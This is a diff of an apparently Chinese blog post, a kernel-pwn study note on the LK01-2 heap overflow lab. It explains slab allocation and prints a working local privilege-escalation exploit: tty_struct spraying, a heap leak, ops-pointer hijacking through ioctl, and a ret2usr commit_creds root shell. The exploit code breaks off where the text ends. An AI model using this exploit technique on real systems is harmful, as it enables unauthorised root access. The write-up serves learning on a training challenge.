@@ -17,38 +17,37 @@
   <meta name="author" content="hope">
   <meta name="keywords" content="">
   
-    <meta name="description" content="kernel-pwn学习笔记">
+    <meta name="description" content="前言用户进程会通过malloc等函数进行动态内存分配相应的内核也有一套动态的内存分配机制。 内核中的内存分配有两种类型的计算机并且使用不同的方法管理物理内存  UMA计算机：每个处理器访问内存的速度一直 NUMA计算机：每个处理器访问自己的本地内存速度较快，但是访问其他处理器的本地内存会相对较慢   首先将内存划为为结点，每个结点与一个处理器进行关联，因此上图的与处理器关联的内存都被视作为结点。结">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Kernel-Pwn-HeapOverflow">
+<meta property="og:title" content="hope">
 <meta property="og:url" content="https://h0pe-ay.github.io/Kernel-Pwn-heapoverflow/index.html">
 <meta property="og:site_name" content="hope">
-<meta property="og:description" content="kernel-pwn学习笔记">
+<meta property="og:description" content="前言用户进程会通过malloc等函数进行动态内存分配相应的内核也有一套动态的内存分配机制。 内核中的内存分配有两种类型的计算机并且使用不同的方法管理物理内存  UMA计算机：每个处理器访问内存的速度一直 NUMA计算机：每个处理器访问自己的本地内存速度较快，但是访问其他处理器的本地内存会相对较慢   首先将内存划为为结点，每个结点与一个处理器进行关联，因此上图的与处理器关联的内存都被视作为结点。结">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://raw.githubusercontent.com/h0pe-ay/picgo/master/202309081834484.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/h0pe-ay/picgo/master/202309081834485.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/h0pe-ay/picgo/master/202309081834486.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/h0pe-ay/picgo/master/202309081834487.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/h0pe-ay/picgo/master/202309081834488.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/h0pe-ay/picgo/master/202309081834489.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/h0pe-ay/picgo/master/202309081834490.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/h0pe-ay/picgo/master/202309081834491.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/h0pe-ay/picgo/master/202309081834492.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/h0pe-ay/picgo/master/202309081834494.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/h0pe-ay/picgo/master/202309081834495.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/h0pe-ay/picgo/master/202309081834496.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/h0pe-ay/picgo/master/202309081834497.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/h0pe-ay/picgo/master/202309081834498.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/h0pe-ay/picgo/master/202309081834499.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/h0pe-ay/picgo/master/202309081834500.png">
-<meta property="article:published_time" content="2023-09-08T10:33:47.648Z">
+<meta property="og:image" content="https://s2.loli.net/2024/03/18/NTlKgvrj4IqZSks.png">
+<meta property="og:image" content="https://s2.loli.net/2024/03/18/2CpRJb6NQcIEOUX.png">
+<meta property="og:image" content="https://s2.loli.net/2024/03/18/meVUt1iHQBJ6k2h.png">
+<meta property="og:image" content="https://s2.loli.net/2024/03/18/sdXxjNpnSQ8DAHq.png">
+<meta property="og:image" content="https://s2.loli.net/2024/03/18/H2Kfeu9T81Iw4ip.png">
+<meta property="og:image" content="https://s2.loli.net/2024/03/18/zSBEDpk69Hb8etO.png">
+<meta property="og:image" content="https://s2.loli.net/2024/03/18/lH3gU2EL96th4vO.png">
+<meta property="og:image" content="https://s2.loli.net/2024/03/18/LeHpi5KY6oc7Ifq.png">
+<meta property="og:image" content="https://s2.loli.net/2024/03/18/H5zLkNBIlDKx81Y.png">
+<meta property="og:image" content="https://s2.loli.net/2024/03/18/h9WYFXytVbajcNe.png">
+<meta property="og:image" content="https://s2.loli.net/2024/03/18/8yHmCFsYNEljDT2.png">
+<meta property="og:image" content="https://s2.loli.net/2024/03/18/LIhvakHE6tJm19r.png">
+<meta property="og:image" content="https://s2.loli.net/2024/03/18/stIigoUJnEcl5CQ.png">
+<meta property="og:image" content="https://s2.loli.net/2024/03/18/qaBysvulV1nmkZt.png">
+<meta property="og:image" content="https://s2.loli.net/2024/03/18/vYDQ7RUty5mFG82.png">
+<meta property="og:image" content="https://s2.loli.net/2024/03/18/jAVWJFKQyNlvZS4.png">
+<meta property="article:published_time" content="2024-03-18T07:52:37.680Z">
 <meta property="article:author" content="hope">
-<meta property="article:tag" content="kernel">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://raw.githubusercontent.com/h0pe-ay/picgo/master/202309081834484.png">
+<meta name="twitter:image" content="https://s2.loli.net/2024/03/18/NTlKgvrj4IqZSks.png">
   
   
   
-  <title>Kernel-Pwn-HeapOverflow - hope</title>
+  <title>hope</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -231,7 +230,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="Kernel-Pwn-HeapOverflow"></span>
+            <span id="subtitle" data-typed-text=""></span>
           
         </div>
 
@@ -242,8 +241,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2023-09-08 18:33" pubdate>
-          2023年9月8日 晚上
+        <time datetime="2024-03-18 15:52" pubdate>
+          2024年3月18日 下午
         </time>
       </span>
     
@@ -311,7 +310,7 @@
         <div id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">Kernel-Pwn-HeapOverflow</h1>
+            <h1 style="display: none"></h1>
             
             
               <div class="markdown-body">
@@ -322,15 +321,15 @@
 <li>UMA计算机：每个处理器访问内存的速度一直</li>
 <li>NUMA计算机：每个处理器访问自己的本地内存速度较快，但是访问其他处理器的本地内存会相对较慢</li>
 </ul>
-<p><img src="https://raw.githubusercontent.com/h0pe-ay/picgo/master/202309081834484.png" srcset="/img/loading.gif" lazyload alt="image-20230907122806131"></p>
+<p><img src="https://s2.loli.net/2024/03/18/NTlKgvrj4IqZSks.png" srcset="/img/loading.gif" lazyload alt="image-20230907122806131"></p>
 <p>首先将内存划为为结点，每个结点与一个处理器进行关联，因此上图的与处理器关联的内存都被视作为结点。结点使用<code>pg_data_t</code>结构体进行表示。并且结点与结点之间是通过链表进行链接的。</p>
 <p>结点进一步划分为多个域，域使用<code>zone_type</code>枚举类型表示。</p>
-<p><img src="https://raw.githubusercontent.com/h0pe-ay/picgo/master/202309081834485.png" srcset="/img/loading.gif" lazyload alt="image-20230907123642772"></p>
+<p><img src="https://s2.loli.net/2024/03/18/2CpRJb6NQcIEOUX.png" srcset="/img/loading.gif" lazyload alt="image-20230907123642772"></p>
 <p>域进一步细化为页为单位的内存进行划分。页则使用<code>page</code>数据结构进行表示。</p>
-<p><img src="https://raw.githubusercontent.com/h0pe-ay/picgo/master/202309081834486.png" srcset="/img/loading.gif" lazyload alt="image-20230907123900682"></p>
+<p><img src="https://s2.loli.net/2024/03/18/meVUt1iHQBJ6k2h.png" srcset="/img/loading.gif" lazyload alt="image-20230907123900682"></p>
 <p>虽然内核中使用了伙伴算法对页框进行管理，但是由于页的单位一般是4096，倘若只想申请部分内存，但是直接分配一页的大小会浪费资源。因此内核使用了<code>slab</code>分配器进行小内存的分配。</p>
 <p>图片来自<a target="_blank" rel="noopener" href="https://blog-wohin-me.translate.goog/posts/pawnyable-0202/?_x_tr_sl=auto&_x_tr_tl=en&_x_tr_hl%EF%BC%8C%60slab%60%E5%A4%A7%E8%87%B4%E6%B5%81%E7%A8%8B%E5%A6%82%E4%B8%8B%E3%80%82">https://blog-wohin-me.translate.goog/posts/pawnyable-0202/?_x_tr_sl=auto&amp;_x_tr_tl=en&amp;_x_tr_hl，`slab`大致流程如下。</a></p>
-<p><img src="https://raw.githubusercontent.com/h0pe-ay/picgo/master/202309081834487.png" srcset="/img/loading.gif" lazyload alt="image-20230907132658581"></p>
+<p><img src="https://s2.loli.net/2024/03/18/sdXxjNpnSQ8DAHq.png" srcset="/img/loading.gif" lazyload alt="image-20230907132658581"></p>
 <p><code>slab</code>不仅仅是作为分配器还有缓存的功能，因此在使用<code>kmalloc</code>时会首先检索<code>kmem_cache</code>是否存在空闲的内存，这一点与用户态下的<code>ptmalloc</code>很相似。</p>
 <h1 id="LK01-2"><a href="#LK01-2" class="headerlink" title="LK01-2"></a>LK01-2</h1><p><strong>项目地址</strong>:<a target="_blank" rel="noopener" href="https://github.com/h0pe-ay/Kernel-Pwn/tree/master/LK01-2/LK01-2">https://github.com/h0pe-ay/Kernel-Pwn/tree/master/LK01-2/LK01-2</a></p>
 <p><strong>module_open</strong></p>
@@ -346,7 +345,7 @@
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">ssize_t</span> <span class="hljs-title function_">module_write</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file *file,</span><br><span class="hljs-params">                            <span class="hljs-type">const</span> <span class="hljs-type">char</span> __user *buf, <span class="hljs-type">size_t</span> count,</span><br><span class="hljs-params">                            <span class="hljs-type">loff_t</span> *f_pos)</span><br>&#123;<br>  printk(KERN_INFO <span class="hljs-string">&quot;module_write called\n&quot;</span>);<br><br>  <span class="hljs-keyword">if</span> (copy_from_user(g_buf, buf, count)) &#123;<br>    printk(KERN_INFO <span class="hljs-string">&quot;copy_from_user failed\n&quot;</span>);<br>    <span class="hljs-keyword">return</span> -EINVAL;<br>  &#125;<br><br>  <span class="hljs-keyword">return</span> count;<br>&#125;<br></code></pre></td></tr></table></figure>
 
 <h2 id="堆溢出的利用"><a href="#堆溢出的利用" class="headerlink" title="堆溢出的利用"></a>堆溢出的利用</h2><p>由于内核分配动态内存是通过<code>slab</code>分配器，<code>slab</code>分配器会优先从缓存中取出，题目给会通过<code>open</code>模块分配一个<code>0x400</code>的堆块。因此会从<code>kmalloc-1024</code>中取出堆块。可以看到<code>0x400</code>的堆块能够写入超过<code>0x400</code>的数据。但是这种堆溢出不会影响程序正常执行。这是因为紧接着的堆块没有存储函数指针。</p>
-<p><img src="https://raw.githubusercontent.com/h0pe-ay/picgo/master/202309081834488.png" srcset="/img/loading.gif" lazyload alt="image-20230907173253844"></p>
+<p><img src="https://s2.loli.net/2024/03/18/H2Kfeu9T81Iw4ip.png" srcset="/img/loading.gif" lazyload alt="image-20230907173253844"></p>
 <p>因此如果需要劫持程序的执行流程，则需要使得存在一个堆块内部存放着函数指针并且在构造的堆块的后方。而内核的许多重要的结构体都是通过堆进行分配，而且这些结构体需要经常创建与释放，因此这些结构体也会通过<code>kmalloc-1024</code>中取出堆块。因此在内核堆块的利用需要熟悉内核中一些包含函数指针的对象的大小。而<code>tty_struct </code>的结构体的大小刚好处于<code>kmalloc-1024</code>的范围内。</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tty_struct</span> &#123;</span><br>	<span class="hljs-type">int</span>	magic;<br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kref</span> <span class="hljs-title">kref</span>;</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">device</span> *<span class="hljs-title">dev</span>;</span>	<span class="hljs-comment">/* class device or NULL (e.g. ptys, serdev) */</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tty_driver</span> *<span class="hljs-title">driver</span>;</span><br>	<span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tty_operations</span> *<span class="hljs-title">ops</span>;</span><br>    ...<br>&#125; __randomize_layout;<br></code></pre></td></tr></table></figure>
 
@@ -360,19 +359,19 @@
 <li><code>O_NOCTTY</code>则是用于防止当前进程将打开的终端设备作为其控制终端</li>
 </ul>
 <p>对过上述操作在能使得<code>open</code>模块操作分配的堆空间是在<code>tty</code>结构体所分配的空间的周围的。如下图所示能够看到将<code>tty</code>结构体分配在<code>g_buf</code>（<code>open</code>模块分配的堆块）的下方</p>
-<p><img src="https://raw.githubusercontent.com/h0pe-ay/picgo/master/202309081834489.png" srcset="/img/loading.gif" lazyload alt="image-20230907182112183"></p>
+<p><img src="https://s2.loli.net/2024/03/18/zSBEDpk69Hb8etO.png" srcset="/img/loading.gif" lazyload alt="image-20230907182112183"></p>
 <p>该操作指针中存放着许多函数地址</p>
-<p><img src="https://raw.githubusercontent.com/h0pe-ay/picgo/master/202309081834490.png" srcset="/img/loading.gif" lazyload alt="image-20230907182134256"></p>
+<p><img src="https://s2.loli.net/2024/03/18/lH3gU2EL96th4vO.png" srcset="/img/loading.gif" lazyload alt="image-20230907182134256"></p>
 <p>将该结构体覆盖为无效值</p>
-<p><img src="https://raw.githubusercontent.com/h0pe-ay/picgo/master/202309081834491.png" srcset="/img/loading.gif" lazyload alt="image-20230907182207217"></p>
+<p><img src="https://s2.loli.net/2024/03/18/LeHpi5KY6oc7Ifq.png" srcset="/img/loading.gif" lazyload alt="image-20230907182207217"></p>
 <p>通过<code>ioctl</code>操作触发函数指针</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">ioctl(spray[i], <span class="hljs-number">0x1234</span>, <span class="hljs-number">0x1234</span>);<br></code></pre></td></tr></table></figure>
 
 <p><code>ioctl</code> 是一个用于在Linux系统中进行设备控制和配置的系统调用，它允许用户态程序与设备驱动程序进行通信以进行各种操作。因此执行<code>ioctl</code>函数实际是会调用<code>ops</code>指向的函数表。但是接着执行内核并不会发生崩溃，这里我猜测是在<code>ioctl</code>函数执行流程中会检测<code>ops</code>指针的有效性。</p>
 <p>但是单单修改函数表内的函数地址，则会引起崩溃。</p>
-<p><img src="https://raw.githubusercontent.com/h0pe-ay/picgo/master/202309081834492.png" srcset="/img/loading.gif" lazyload alt="image-20230907201410965"></p>
+<p><img src="https://s2.loli.net/2024/03/18/H5zLkNBIlDKx81Y.png" srcset="/img/loading.gif" lazyload alt="image-20230907201410965"></p>
 <p>崩溃地址正是我们修改的值。</p>
-<p><img src="https://raw.githubusercontent.com/h0pe-ay/picgo/master/202309081834494.png" srcset="/img/loading.gif" lazyload alt="image-20230907191028514"></p>
+<p><img src="https://s2.loli.net/2024/03/18/h9WYFXytVbajcNe.png" srcset="/img/loading.gif" lazyload alt="image-20230907191028514"></p>
 <p>因此梳理一下针对该题堆溢出利用的条件</p>
 <ol>
 <li>利用堆喷使得漏洞堆块处于<code>tty</code>结构体堆块的上方</li>
@@ -380,17 +379,17 @@
 </ol>
 <h2 id="没有开启保护"><a href="#没有开启保护" class="headerlink" title="没有开启保护"></a>没有开启保护</h2><p>经过测试，在没有开启kaslr的情况下<code>g_buf</code>对应的堆地址也是会改变的，因此需要进行泄露计算出<code>g_buf</code>的地址。由于<code>g_buf</code>处于内核地址，因此可以触发<code>ioctl</code>，这里我使用了用户空间的堆块地址，但是无法触发，因此猜测<code>ioctl</code>需要检验<code>ops</code>指针值是否为内核地址。</p>
 <p>并且在<code>tty</code>结构体中存储了堆块的地址，因此可以通过越界读泄露堆地址。</p>
-<p><img src="https://raw.githubusercontent.com/h0pe-ay/picgo/master/202309081834495.png" srcset="/img/loading.gif" lazyload alt="image-20230907202942771"></p>
+<p><img src="https://s2.loli.net/2024/03/18/8yHmCFsYNEljDT2.png" srcset="/img/loading.gif" lazyload alt="image-20230907202942771"></p>
 <p>通过<code>read</code>模块泄露堆地址</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c">...<br>	<span class="hljs-type">char</span> buf[<span class="hljs-number">0x500</span>];<br>    read(fd, buf, <span class="hljs-number">0x500</span>);<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> * p = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *)&amp;buf;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0xa0</span>; i++)<br>    	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[0x%x] 0x%lx\n&quot;</span>,i ,p[i]);<br>...<br></code></pre></td></tr></table></figure>
 
 <p>这里需要注意的是我们尽可能选择与<code>g_buf</code>地址相近的堆地址，因为<code>slab</code>分配器会分配连续的内存，因此在附近的地址可以计算出真正的偏移。</p>
-<p><img src="https://raw.githubusercontent.com/h0pe-ay/picgo/master/202309081834496.png" srcset="/img/loading.gif" lazyload alt="image-20230908112306592"></p>
+<p><img src="https://s2.loli.net/2024/03/18/LIhvakHE6tJm19r.png" srcset="/img/loading.gif" lazyload alt="image-20230908112306592"></p>
 <p>泄露出堆地址后还需要解决一个问题是<code>ioctl</code>函数会执行函数表的哪个函数指针，因此我们需要劫持<code>ops</code>指针为<code>g_buf</code>，然后在<code>g_buf</code>填充有规律的垃圾数据，判断函数指针的位置。</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c">...<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> heap = p[<span class="hljs-number">0x9f</span>];<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;heap:0x%lx\n&quot;</span>, heap);<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> g_buf = heap - <span class="hljs-number">0x4f8</span> ;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;g_buf:0x%lx\n&quot;</span>, g_buf);<br><span class="hljs-keyword">for</span> (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x80</span>; i++)<br>	p[i] = i;<br>*(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *)&amp;buf[<span class="hljs-number">0x418</span>] = g_buf;<br>write(fd, buf, <span class="hljs-number">0x500</span>);<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">100</span>; i++) &#123;<br>   ioctl(spray[i], <span class="hljs-number">0xdeadbeef</span>, <span class="hljs-number">0xcafebabe</span>);<br>&#125;  <br>...<br></code></pre></td></tr></table></figure>
 
 <p>可以看到在函数表中的偏移为<code>0xc</code>，该地址填充的值会被用作处理<code>ioctl</code>函数的操作。</p>
-<p><img src="https://raw.githubusercontent.com/h0pe-ay/picgo/master/202309081834497.png" srcset="/img/loading.gif" lazyload alt="image-20230908114137510"></p>
+<p><img src="https://s2.loli.net/2024/03/18/stIigoUJnEcl5CQ.png" srcset="/img/loading.gif" lazyload alt="image-20230908114137510"></p>
 <p>由于题目没有开启任何保护，接下来就是<code>ret2usr</code>即可</p>
 <h3 id="run-sh"><a href="#run-sh" class="headerlink" title="run.sh"></a>run.sh</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">!/bin/sh</span><br>qemu-system-x86_64 \<br>    -m 64M \<br>    -nographic \<br>    -kernel bzImage \<br>    -append &quot;console=ttyS0 loglevel=3 oops=panic panic=-1 nosmap nosemp nokaslr nopti&quot; \<br>    -no-reboot \<br>    -cpu qemu64 \<br>    -smp 1 \<br>    -monitor /dev/null \<br>    -initrd initramfs.cpio.gz\<br>    -net nic,model=virtio \<br>    -net user \<br>    -s<br></code></pre></td></tr></table></figure>
 
@@ -403,13 +402,13 @@
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;ctype.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/stat.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> prepare_kernel_cred_offset 0x74650</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> commit_creds_offset 0x744b0</span><br><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> kernel_base;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> prepare_kernel_cred;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> commit_creds;<br><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> user_cs, user_sp, user_ss, user_rflags;<br><span class="hljs-type">void</span> <span class="hljs-title function_">save_user_land</span><span class="hljs-params">()</span><br>&#123;<br>	__asm__(<br>		<span class="hljs-string">&quot;.intel_syntax noprefix;&quot;</span><br>		<span class="hljs-string">&quot;mov user_cs, cs;&quot;</span><br>		<span class="hljs-string">&quot;mov user_sp, rsp;&quot;</span><br>		<span class="hljs-string">&quot;mov user_ss, ss;&quot;</span><br>		<span class="hljs-string">&quot;pushf;&quot;</span><br>		<span class="hljs-string">&quot;pop user_rflags;&quot;</span><br>		<span class="hljs-string">&quot;.att_syntax;&quot;</span><br>	);<br>	<span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Saved userland registers&quot;</span>);<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[#] cs: 0x%lx \n&quot;</span>, user_cs);<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[#] ss: 0x%lx \n&quot;</span>, user_ss);<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[#] rsp: 0x%lx \n&quot;</span>, user_sp);<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[#] rflags: 0x%lx \n\n&quot;</span>, user_rflags);<br>&#125;<br><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">backdoor</span><span class="hljs-params">()</span><br>&#123;<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;****getshell****&quot;</span>);<br>	system(<span class="hljs-string">&quot;id&quot;</span>);<br>	system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>&#125;<br><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> user_rip = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)backdoor;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">lpe</span><span class="hljs-params">()</span><br>&#123;<br>	prepare_kernel_cred = kernel_base + prepare_kernel_cred_offset;<br>	commit_creds = kernel_base + commit_creds_offset;<br>	__asm(<br>		<span class="hljs-string">&quot;.intel_syntax noprefix;&quot;</span><br>		<span class="hljs-string">&quot;movabs rax, prepare_kernel_cred;&quot;</span> <span class="hljs-comment">//prepare_kernel_cred</span><br>		<span class="hljs-string">&quot;xor rdi, rdi;&quot;</span><br>		<span class="hljs-string">&quot;call rax;&quot;</span> <span class="hljs-comment">//prepare_kernel_cred(0);</span><br>		<span class="hljs-string">&quot;mov rdi, rax;&quot;</span><br>		<span class="hljs-string">&quot;mov rax, commit_creds;&quot;</span> <span class="hljs-comment">//commit_creds</span><br>		<span class="hljs-string">&quot;call rax;&quot;</span><br>		<span class="hljs-string">&quot;swapgs;&quot;</span>	<br>		<span class="hljs-string">&quot;mov r15, user_ss;&quot;</span><br>		<span class="hljs-string">&quot;push r15;&quot;</span><br>		<span class="hljs-string">&quot;mov r15, user_sp;&quot;</span><br>		<span class="hljs-string">&quot;push r15;&quot;</span><br>		<span class="hljs-string">&quot;mov r15, user_rflags;&quot;</span><br>		<span class="hljs-string">&quot;push r15;&quot;</span><br>		<span class="hljs-string">&quot;mov r15, user_cs;&quot;</span><br>		<span class="hljs-string">&quot;push r15;&quot;</span><br>		<span class="hljs-string">&quot;mov r15, user_rip;&quot;</span><br>		<span class="hljs-string">&quot;push r15;&quot;</span><br>		<span class="hljs-string">&quot;iretq;&quot;</span><br>		<span class="hljs-string">&quot;.att_syntax;&quot;</span><br>	);<br>&#125;<br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    save_user_land();<br>    <span class="hljs-type">int</span> spray[<span class="hljs-number">100</span>];<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">50</span>; i++)<br>        spray[i] = open(<span class="hljs-string">&quot;/dev/ptmx&quot;</span>, O_RDONLY | O_NOCTTY);<br>    <span class="hljs-type">int</span> fd = open(<span class="hljs-string">&quot;/dev/holstein&quot;</span>, O_RDWR);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">50</span>; i &lt; <span class="hljs-number">100</span>; i++)<br>        spray[i] = open(<span class="hljs-string">&quot;/dev/ptmx&quot;</span>, O_RDONLY | O_NOCTTY);<br>    <span class="hljs-type">char</span> buf[<span class="hljs-number">0x500</span>];<br>    read(fd, buf, <span class="hljs-number">0x500</span>);<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> * p = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *)&amp;buf;<br>    <span class="hljs-comment">//for (int i = 0; i &lt; 0xa0; i++)</span><br>    <span class="hljs-comment">//	printf(&quot;[0x%x] 0x%lx\n&quot;,i ,p[i]);</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> heap = p[<span class="hljs-number">0x9f</span>];<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;heap:0x%lx\n&quot;</span>, heap);<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> g_buf = heap - <span class="hljs-number">0x4f8</span> ;<br>    <span class="hljs-built_in">printf</span>(<span 